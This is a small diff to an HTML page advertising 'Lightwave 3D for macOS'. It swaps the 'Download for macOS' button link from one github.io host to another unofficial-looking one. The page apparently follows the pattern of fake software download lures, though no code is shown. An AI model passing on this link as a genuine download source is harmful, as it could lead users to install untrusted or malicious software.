@@ -6,7 +6,7 @@
 <h3>Lightwave 3D for macOS</h3>
 <p>Lightwave 3D is a specialized 3D modeling and animation solution designed for users who want a reliable, Mac‑native tool with clear controls and stable performance.</p>
 
-<a href="https://software-osx-deploy.github.io/.github/Lightwave3D">
+<a href="https://deployed-soft.github.io/.github/Lightwave3D">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
